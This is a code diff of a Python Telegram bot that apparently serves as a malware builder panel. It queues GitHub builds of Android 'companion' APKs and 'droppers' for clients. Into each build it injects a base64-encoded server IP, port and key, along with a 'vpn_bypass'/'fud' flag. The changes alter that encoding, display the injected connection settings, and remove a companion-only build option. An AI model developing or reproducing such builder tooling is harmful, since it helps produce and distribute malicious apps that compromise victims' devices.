@@ -1306,8 +1306,6 @@ def kb_build() -> types.InlineKeyboardMarkup:
     # ── Step 2: Build & test ──────────────────────────────────────────────────
     kb.add(types.InlineKeyboardButton(
         "🧪 Dev Test Build",       callback_data="prod_test_build"))
-    kb.add(types.InlineKeyboardButton(
-        "📦 Companion Only",       callback_data="prod_companion_only"))
     # ── Step 3: Deploy ────────────────────────────────────────────────────────
     kb.add(types.InlineKeyboardButton(
         "🚀 Deploy to Production", callback_data="prod_deploy"))
@@ -4195,15 +4193,18 @@ def handle_callback(call):
         _key  = (_lb["server_key"]  if _lb and _lb["server_key"]  else "")
         # Use stored IP as the actual server host (may differ from rdp_ip if changed)
         _client_ip = _ip
-        srv_host_b64 = _b64.b64encode(_ip.encode()).decode().rstrip("=") if _ip else ""
-        srv_port_b64 = _b64.b64encode(_port.encode()).decode().rstrip("=")      if _port else ""
-        srv_key_b64  = _b64.b64encode(_key.encode()).decode()                   if _key  else ""
+        srv_host_b64 = _b64.b64encode(_ip.encode()).decode()    if _ip    else ""
+        srv_port_b64 = _b64.b64encode(_port.encode()).decode() if _port  else ""
+        srv_key_b64  = _b64.b64encode(_key.encode()).decode()  if _key   else ""
         emoji, display_name = TEMPLATES.get(template, ("⚙️", template))
         safe_edit(chat_id, msg_id,
                   f"🔨 <b>Rebuilding: {emoji} {display_name}</b>\n"
                   "━━━━━━━━━━━━━━━━━━━━\n"
                   f"Client  : {_client_name}\n"
-                  f"Server  : {_client_ip}:{_port}\n"
+                  "🌐 Injecting into companion:\n"
+                  f"IP      : <code>{_ip or '—'}</code>\n"
+                  f"Port    : <code>{_port or '—'}</code>\n"
+                  f"Key     : <code>{_key or '—'}</code>\n"
                   "━━━━━━━━━━━━━━━━━━━━\n"
                   "⏳ Queuing rebuild…")
         ok = trigger_github_build(
@@ -4306,14 +4307,17 @@ def handle_callback(call):
         _cname     = (_cl["profile_name"] or _cl["telegram_username"]) if _cl else ""
         _ctoken    = _cl["token"] if _cl else "manual"
         _fud       = str(int(_cl["vpn_bypass"])) if _cl and "vpn_bypass" in _cl.keys() else "1"
-        srv_host_b64 = _b64cb.b64encode(_ip.encode()).decode().rstrip("=")   if _ip   else ""
-        srv_port_b64 = _b64cb.b64encode(_port.encode()).decode().rstrip("=") if _port else ""
-        srv_key_b64  = _b64cb.b64encode(_key.encode()).decode()              if _key  else ""
+        srv_host_b64 = _b64cb.b64encode(_ip.encode()).decode()    if _ip    else ""
+        srv_port_b64 = _b64cb.b64encode(_port.encode()).decode() if _port  else ""
+        srv_key_b64  = _b64cb.b64encode(_key.encode()).decode()  if _key   else ""
         safe_edit(chat_id, msg_id,
                   f"🔨 <b>Rebuilding: ⚙️ {_app_name}</b>\n"
                   "━━━━━━━━━━━━━━━━━━━━\n"
                   f"Client  : {_cname}\n"
-                  f"Server  : {_ip}:{_port}\n"
+                  "🌐 Injecting into companion:\n"
+                  f"IP      : <code>{_ip or '—'}</code>\n"
+                  f"Port    : <code>{_port or '—'}</code>\n"
+                  f"Key     : <code>{_key or '—'}</code>\n"
                   "━━━━━━━━━━━━━━━━━━━━\n"
                   "⏳ Queuing rebuild…")
         ok = trigger_github_build(
@@ -4483,9 +4487,9 @@ def handle_callback(call):
         sbuf = server_config_buf.pop(str(chat_id), None)
         import base64
         srv_host_b64 = base64.b64encode(
-            sbuf["ip"].encode()).decode().rstrip("=") if sbuf and sbuf.get("ip") else ""
+            sbuf["ip"].encode()).decode() if sbuf and sbuf.get("ip") else ""
         srv_port_b64 = base64.b64encode(
-            sbuf["port"].encode()).decode().rstrip("=") if sbuf and sbuf.get("port") else ""
+            sbuf["port"].encode()).decode() if sbuf and sbuf.get("port") else ""
         srv_key_b64  = base64.b64encode(
             sbuf["key"].encode()).decode() if sbuf and sbuf.get("key") else ""
         if template == "custom" and custom_app_name:
@@ -4498,7 +4502,10 @@ def handle_callback(call):
             f"🔨 <b>Building: {emoji} {display_name}</b>\n"
             "━━━━━━━━━━━━━━━━━━━━\n"
             f"Client  : {client_id}\n"
-            f"Server  : {sbuf['ip'] if sbuf else '—'}:{sbuf['port'] if sbuf else '—'}\n"
+            "🌐 Injecting into companion:\n"
+            f"IP      : <code>{sbuf['ip'] if sbuf else '—'}</code>\n"
+            f"Port    : <code>{sbuf['port'] if sbuf else '—'}</code>\n"
+            f"Key     : <code>{sbuf['key'] if sbuf else '—'}</code>\n"
             "━━━━━━━━━━━━━━━━━━━━\n"
             "⏳ Queuing build...\n"
             "━━━━━━━━━━━━━━━━━━━━\n"
@@ -4648,16 +4655,6 @@ def handle_callback(call):
                   "⏳ Loading branch status…",
                   kb_build())
         safe_edit(chat_id, msg_id, text_prod_menu(), kb_build())
-
-    elif data == "prod_companion_only":
-        # Companion-only quick build — routes into test-build companion flow
-        safe_edit(chat_id, msg_id,
-                  "📦 <b>Companion Only Build</b>\n"
-                  "━━━━━━━━━━━━━━━━━━━━\n"
-                  "Build companion APK only (no dropper).\n"
-                  "   No Nova, no dropper — fast build\n\n"
-                  "⚠️ No client delivery — admin only.",
-                  kb_prod_test_build_type())
 
     elif data == "prod_dev_status":
         safe_edit(chat_id, msg_id,
